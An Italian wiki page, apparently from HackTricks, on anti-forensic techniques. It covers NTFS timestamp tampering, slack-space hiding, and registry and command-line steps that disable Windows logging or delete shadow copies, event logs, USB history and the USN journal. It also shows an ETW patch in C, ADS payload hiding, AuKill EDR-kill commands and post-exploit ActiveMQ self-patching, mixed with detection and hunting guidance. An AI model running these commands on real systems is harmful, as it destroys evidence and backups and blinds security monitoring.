# Tecniche Anti-Forensic

{{#include ../../banners/hacktricks-training.md}}

## Timestamp

Un attaccante potrebbe essere interessato a **modificare i timestamp dei file** per evitare di essere rilevato.\
È possibile trovare i timestamp all'interno dell'MFT negli attributi `$STANDARD_INFORMATION` \_\_ e \_\_ `$FILE_NAME`.

Entrambi gli attributi hanno 4 timestamp: **modifica**, **accesso**, **creazione** e **modifica del registro MFT** (MACE o MACB).

**Windows explorer** e altri strumenti mostrano le informazioni provenienti da **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Questo strumento **modifica** le informazioni sui timestamp all'interno di **`$STANDARD_INFORMATION`**, ma **non** le informazioni all'interno di **`$FILE_NAME`**. Pertanto, è possibile **identificare** attività **sospette**.

### Usnjrnl

L'**USN Journal** (Update Sequence Number Journal) è una funzionalità di NTFS (Windows NT file system) che tiene traccia delle modifiche al volume. Lo strumento [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) consente di esaminare queste modifiche.

![TimeStomp - Anti-forensic Tool - Usnjrnl: l'USN Journal (Update Sequence Number Journal) è una funzionalità di NTFS (Windows NT file system) che tiene traccia delle modifiche al volume. Lo...](<../../images/image (801).png>)

L'immagine precedente mostra l'**output** dello **strumento**, nel quale è possibile osservare che sono state apportate alcune **modifiche** al file.

### $LogFile

**Tutte le modifiche ai metadati di un file system vengono registrate** in un processo noto come [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). I metadati registrati vengono conservati in un file denominato `**$LogFile**`, situato nella directory principale di un file system NTFS. Strumenti come [LogFileParser](https://github.com/jschicht/LogFileParser) possono essere utilizzati per analizzare questo file e identificare le modifiche.

![Usnjrnl - $LogFile: tutte le modifiche ai metadati di un file system vengono registrate in un processo noto come write-ahead logging. I metadati registrati vengono conservati in un file denominato $LogFile, situato nella directory principale...](<../../images/image (137).png>)

Anche in questo caso, nell'output dello strumento è possibile vedere che sono state apportate **alcune modifiche**.

Utilizzando lo stesso strumento è possibile identificare **a quale ora sono stati modificati i timestamp**:

![Usnjrnl - $LogFile: utilizzando lo stesso strumento è possibile identificare a quale ora sono stati modificati i timestamp](<../../images/image (1089).png>)

- CTIME: ora di creazione del file
- ATIME: ora di modifica del file
- MTIME: modifica del registro MFT del file
- RTIME: ora di accesso al file

### Confronto tra `$STANDARD_INFORMATION` e `$FILE_NAME`

Un altro modo per identificare i file modificati sospetti consiste nel confrontare l'ora in entrambi gli attributi, cercando **incongruenze**.

### Nanosecondi

I timestamp **NTFS** hanno una **precisione** di **100 nanosecondi**. Di conseguenza, trovare file con timestamp come 2010-10-10 10:10:**00.000:0000 è molto sospetto**.

### SetMace - Anti-forensic Tool

Questo strumento può modificare entrambi gli attributi `$STARNDAR_INFORMATION` e `$FILE_NAME`. Tuttavia, a partire da Windows Vista, per modificare queste informazioni è necessario un sistema operativo live.

## Data Hiding

NFTS utilizza i cluster e la dimensione minima delle informazioni. Ciò significa che, se un file occupa un cluster e mezzo, la **metà rimanente non verrà mai utilizzata** finché il file non viene eliminato. È quindi possibile **nascondere dati in questo slack space**.

Esistono strumenti come slacker che consentono di nascondere dati in questo spazio "nascosto". Tuttavia, un'analisi di `$logfile` e `$usnjrnl` può mostrare che sono stati aggiunti alcuni dati:

![SetMace - Anti-forensic Tool - Data Hiding: esistono strumenti come slacker che consentono di nascondere dati in questo spazio "nascosto". Tuttavia, un'analisi di $logfile e $usnjrnl può mostrare che...](<../../images/image (1060).png>)

È quindi possibile recuperare lo slack space utilizzando strumenti come FTK Imager. Si noti che questo tipo di strumento può salvare il contenuto offuscato o persino crittografato.

## UsbKill

Questo è uno strumento che **spegne il computer se rileva una modifica** nelle porte **USB**.\
Un modo per individuarlo consiste nell'ispezionare i processi in esecuzione e **controllare ogni script Python in esecuzione**.

## Live Linux Distributions

Queste distro vengono **eseguite nella memoria RAM**. L'unico modo per rilevarle è **nel caso in cui il file system NTFS sia montato con permessi di scrittura**. Se viene montato solo con permessi di lettura, non sarà possibile rilevare l'intrusione.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

È possibile disabilitare diversi metodi di logging di Windows per rendere molto più difficile l'indagine forense.

### Disable Timestamps - UserAssist

Si tratta di una chiave di registro che mantiene le date e gli orari in cui ogni eseguibile è stato avviato dall'utente.

La disabilitazione di UserAssist richiede due passaggi:

1. Impostare a zero entrambe le chiavi di registro `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` e `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, per segnalare che si desidera disabilitare UserAssist.
2. Cancellare i sottoalberi del registro simili a `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Questa funzionalità salva informazioni sulle applicazioni eseguite con l'obiettivo di migliorare le prestazioni del sistema Windows. Tuttavia, può essere utile anche per le attività forensi.

- Eseguire `regedit`
- Selezionare il percorso del file `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Fare clic con il pulsante destro del mouse su `EnablePrefetcher` e `EnableSuperfetch`
- Selezionare Modify su ciascuno di essi per modificare il valore da 1 (o 3) a 0
- Riavviare

### Disable Timestamps - Last Access Time

Ogni volta che una cartella viene aperta da un volume NTFS su un server Windows NT, il sistema aggiorna un campo timestamp in ogni cartella elencata, denominato ora dell'ultimo accesso. In un volume NTFS utilizzato intensivamente, ciò può influire sulle prestazioni.

1. Aprire l'Editor del Registro di sistema (Regedit.exe).
2. Accedere a `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Cercare `NtfsDisableLastAccessUpdate`. Se non esiste, aggiungere questo DWORD e impostarne il valore su 1, disabilitando così il processo.
4. Chiudere l'Editor del Registro di sistema e riavviare il server.

### Delete USB History

Tutte le **voci dei dispositivi USB** sono memorizzate nel Registro di Windows, nella chiave di registro **USBSTOR**, che contiene sottochiavi create ogni volta che si collega un dispositivo USB al PC o laptop. È possibile trovare questa chiave qui H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Eliminandola**, verrà eliminata la cronologia USB.\
È inoltre possibile utilizzare lo strumento [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) per assicurarsi di averle eliminate (e per eliminarle).

Un altro file che salva informazioni sui dispositivi USB è `setupapi.dev.log`, situato in `C:\Windows\INF`. Anche questo dovrebbe essere eliminato.

### Disable Shadow Copies

**Elencare** le shadow copies con `vssadmin list shadowstorage`\
**Eliminarle** eseguendo `vssadmin delete shadow`

È inoltre possibile eliminarle tramite GUI seguendo i passaggi indicati in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Per disabilitare le shadow copies, [seguire questi passaggi](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Aprire il programma Services digitando "services" nella casella di ricerca testuale dopo aver fatto clic sul pulsante Start di Windows.
2. Nell'elenco, trovare "Volume Shadow Copy", selezionarlo e accedere a Properties facendo clic con il pulsante destro del mouse.
3. Selezionare Disabled dal menu a discesa "Startup type", quindi confermare la modifica facendo clic su Apply e OK.

È inoltre possibile modificare nel registro la configurazione dei file che verranno copiati nella shadow copy: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- È possibile utilizzare uno **strumento Windows**: `cipher /w:C`. Questo indicherà a cipher di rimuovere tutti i dati dallo spazio disponibile non utilizzato del disco C.
- È inoltre possibile utilizzare strumenti come [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Espandere "Windows Logs" --> Fare clic con il pulsante destro del mouse su ogni categoria e selezionare "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Nella sezione dei servizi, disabilitare il servizio "Windows Event Log"
- `WEvtUtil.exec clear-log` o `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Le versioni recenti di Windows 10/11 e Windows Server conservano **ricchi artefatti forensi di PowerShell** in
`Microsoft-Windows-PowerShell/Operational` (eventi 4104/4105/4106).
Gli attaccanti possono disabilitarli o cancellarli al volo:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
I difensori dovrebbero monitorare le modifiche a quelle chiavi di registro e la rimozione ad alto volume di eventi PowerShell.

### Patch di ETW (Event Tracing for Windows)

I prodotti di sicurezza degli endpoint fanno ampio affidamento su ETW. Un metodo di evasione popolare nel 2024 consiste nel applicare una patch a `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memoria, in modo che ogni chiamata ETW restituisca `STATUS_SUCCESS` senza generare l'evento:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
I PoC pubblici (ad es. `EtwTiSwallow`) implementano la stessa primitive in PowerShell o C++.
Poiché la patch è **locale al processo**, gli EDR in esecuzione all'interno di altri processi potrebbero non rilevarla.<sup>[[5]](#references)</sup>
Rilevamento: confrontare `ntdll` in memoria con quella su disco, oppure applicare l'hook prima della user-mode.

### Rinascita degli Alternate Data Streams (ADS)

Campagne malware nel 2023 (ad es. i loader di **FIN12**) sono state osservate mentre posizionavano binari di secondo stadio
all'interno degli ADS per rimanere fuori dalla vista degli scanner tradizionali:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumera gli stream con `dir /R`, `Get-Item -Stream *` o `streams64.exe` di Sysinternals.
La copia del file host su FAT/exFAT o tramite SMB rimuoverà lo stream nascosto e può essere utilizzata
dagli investigatori per recuperare il payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver viene ora utilizzato regolarmente per l’**anti-forensics** nelle intrusioni
ransomware.
Lo strumento open-source **AuKill** carica un driver firmato ma vulnerabile (`procexp152.sys`) per
sospendere o terminare EDR e sensori forensi **prima della cifratura e della distruzione dei log**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Il driver viene rimosso successivamente, lasciando artefatti minimi.<sup>[[1]](#references)</sup>
Mitigazioni: abilitare la Microsoft vulnerable-driver blocklist (HVCI/SAC)
e generare un alert sulla creazione di kernel-service da percorsi scrivibili dall'utente.

---

## Linux Anti-Forensics: Self-Patching e Cloud C2 (2023–2025)

### Self-patching dei servizi compromessi per ridurre il rilevamento (Linux)
Gli avversari eseguono sempre più spesso il “self-patching” di un servizio subito dopo averlo sfruttato, sia per impedire una nuova exploitation sia per sopprimere i rilevamenti basati sulle vulnerabilità. L'idea è sostituire i componenti vulnerabili con i più recenti binari/JAR legittimi upstream, in modo che gli scanner segnalino l'host come aggiornato, mentre persistence e C2 rimangono attivi.<sup>[[3]](#references)</sup>

Esempio: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Dopo l'exploitation, gli attaccanti hanno scaricato JAR legittimi da Maven Central (repo1.maven.org), eliminato i JAR vulnerabili dall'installazione di ActiveMQ e riavviato il broker.
- Questo ha chiuso la RCE iniziale mantenendo altri foothold (cron, modifiche alla configurazione SSH, impianti C2 separati).

Esempio operativo (illustrativo)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Consigli di forensics/hunting
- Esaminare le directory dei servizi per individuare sostituzioni non programmate di binari/JAR:
- Debian/Ubuntu: `dpkg -V activemq` e confrontare hash/percorso dei file con i mirror dei repository.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Cercare versioni dei JAR presenti sul disco che non risultano gestite dal package manager, oppure symbolic link aggiornati out of band.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` per correlare ctime/mtime con la finestra della compromissione.
- Cronologia della shell/telemetria dei processi: tracce di `curl`/`wget` verso `repo1.maven.org` o altri artifact CDN subito dopo lo sfruttamento iniziale.
- Change management: verificare chi ha applicato la “patch” e perché, non solo che sia presente una versione patched.

### C2 cloud-service con bearer token e stager anti-analisi
Il tradecraft osservato combinava più percorsi C2 long-haul e un packaging anti-analisi:<sup>[[3]](#references)</sup>
- Loader ELF PyInstaller protetti da password per ostacolare il sandboxing e l'analisi statica (ad es., PYZ cifrato, estrazione temporanea in `/_MEI*`).
- Indicatori: risultati di `strings` come `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artifact runtime: estrazione in `/tmp/_MEI*` o in percorsi personalizzati `--runtime-tmpdir`.
- C2 basato su Dropbox che utilizza OAuth Bearer token hardcoded
- Indicatori di rete: `api.dropboxapi.com` / `content.dropboxapi.com` con `Authorization: Bearer <token>`.
- Cercare in proxy/NetFlow/Zeek/Suricata connessioni HTTPS in uscita verso domini Dropbox da workload server che normalmente non sincronizzano file.
- C2 parallelo/di backup tramite tunneling (ad es., Cloudflare Tunnel `cloudflared`), mantenendo il controllo se un canale viene bloccato.
- IOC host: processi/unità `cloudflared`, configurazione in `~/.cloudflared/*.json`, connessioni in uscita sulla porta 443 verso gli edge Cloudflare.

### Persistence e “rollback dell'hardening” per mantenere l'accesso (esempi Linux)
Gli attacker associano spesso il self-patching a percorsi di accesso persistenti:<sup>[[3]](#references)</sup>
- Cron/Anacron: modifiche allo stub `0anacron` in ogni directory `/etc/cron.*/` per l'esecuzione periodica.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback dell'hardening della configurazione SSH: abilitazione dei login root e modifica delle shell predefinite per gli account con bassi privilegi.
- Cercare l'abilitazione del login root:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# segnalare valori come "yes" o impostazioni eccessivamente permissive
```
- Cercare shell interattive sospette sugli account di sistema (ad es., `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Artifact beacon casuali con nomi brevi (8 caratteri alfabetici) scritti su disco che contattano anche il cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

I defender dovrebbero correlare questi artifact con l'esposizione esterna e gli eventi di patching dei servizi per individuare il self-remediation anti-forensics utilizzato per nascondere lo sfruttamento iniziale.

## References

- [1] [Sophos X-Ops – AuKill: un driver vulnerabile weaponized per disabilitare EDR (marzo 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching di EtwEventWrite per lo stealth: rilevamento e hunting (giugno 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching per la persistence: come il malware Linux DripDropper si muove nel cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Nascondere il proprio .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
